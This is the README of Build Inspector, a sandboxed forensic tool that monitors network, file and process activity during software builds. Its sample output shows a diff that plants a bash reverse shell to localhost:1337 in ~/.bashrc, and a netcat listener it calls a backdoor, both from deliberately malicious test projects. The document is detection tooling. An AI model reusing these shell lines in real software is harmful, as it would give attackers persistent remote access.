# Build Inspector

[Build Inspector](https://github.com/srcclr/build-inspector) is a forensic sandbox for buliding source code and gives insight into what's happening during the build of a project. It's language and build system agnostic and is capable of inspecting network activities, file system changes, and running
processes. All build operations happen in a sandboxed environment without
compromising the developer's machine.

## Requirements

- [Ruby](https://www.ruby-lang.org/en/downloads/) (2.2.3 recommended)
- [Vagrant](https://www.vagrantup.com/)

Once you have both Ruby and Vagrant installed, go ahead and install
the Sahara plugin, bundler and this project's dependencies.

```bash
vagrant plugin install sahara
git clone https://github.com/srcclr/build-inspector.git
gem install bundler
bundle install
```

## Running

First, make sure that you have the
[requirements](https://github.com/srcclr/build-inspector#requirements)
and you are inside the repository's directory.

```bash
cd build_inspector
```

Since this tool does not manage Vagrant for you, yet, you'll have to
do it yourself. This step will take a while the first time, but won't
be necessary again. Eventually, this step will be eliminated. Start
Vagrant and build the image:

```bash
vagrant up
```

Once vagrant is started, save a snapshot with:
```bash
vagrant sandbox on
```

### Usage

```
Usage inspector [options] <git repo URL>
    -h, --help                       Display this screen
    -n, --no-rollback                Do not roll back the virtual machine state after running
    -c, --config <PATH>              Use configuration file at <PATH>, default=config.yml
    -p, --process <PATH>             Only process evidence at <PATH>
    -b, --branch <BRANCH>            Clone <BRANCH> from repository URL
```

### Gradle Example

```bash
cp configs/gradle_template.yml config.yml
./inspector https://github.com/jsyeo/TotallyLegitApp
```

The above project has a task called `backdoor` that adds a reverse
connect shell to `~/.bashrc`.

After running, you should see this at the bottom of the output:

```
changed: ~/.bashrc
--- /backup/root/.bashrc	2014-02-19 21:43:56.000000000 -0500
+++ /root/.bashrc	2015-11-08 13:07:40.579626388 -0500
@@ -97,3 +97,5 @@
 #if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
 #    . /etc/bash_completion
 #fi
+
+bash -c "bash -i>&/dev/tcp/localhost/1337 0>&1 &disown"&>/dev/null
```

In addition, you'll have a file that looks like
`evidence-TotallyLegitApp-201523110032412.zip` which has all the
network and process activity, file system changes, and any new processes.

### Bundler Example

```bash
cp configs/bundler_template.yml config.yml
./inspector https://github.com/jsyeo/harmless-project
```

This bundler project has a gem that pings Google during its
installation.

Run it with the Build Inspector and you should see a list of domains
that the machine tried to connect to.

```
Hosts contacted:
  www.google.com (74.125.224.113)                                    1.3K
```

### NPM Example

```bash
cp configs/npm_template.yml config.yml
./inspector https://github.com/jsyeo/ann-pee-am
```

Inspecting this NPM project should yield the following output:

```
The following processes were running during the build:
  - /bin/sh -i
  - nc -l 0.0.0.0 8080
```

That's because the NPM project depends on a module that opens a
persistent backdoor using `netcat`.

### Configuration

The tool monitors all network and file system activities. To ignore
hosts or exclude directories from the monitoring, create and add an
`config.yml` in the repository. The `config.yml' file is simply
a YAML file that looks like this:

```yaml
---

commands: bundle install --jobs 2

host_whitelist:
  - 10.0.2.2 # Vagrant's IP
  - 8.8.8.8 # Ignore DNS
  - bundler.rubygems.org
  - rubygems.global.ssl.fastly.net
  - rubygems.org

evidence_files:
  exclude:
    - /home/vagrant/.gem
  include:
    - /etc
```

There are examples for different build systems in the [configs](configs)
directory. You may copy the approriate configs for your build system
to the root of this project or you may write one from scratch.

## Development

When you want to experiment, just do:
`vagrant sandbox on`

Then, make all the changes you want to the image. If you'd like to save the changes, do:
`vagrant sandbox commit`

Otherwise, you can wipe out the changes with:
`vagrant sandbox rollback`
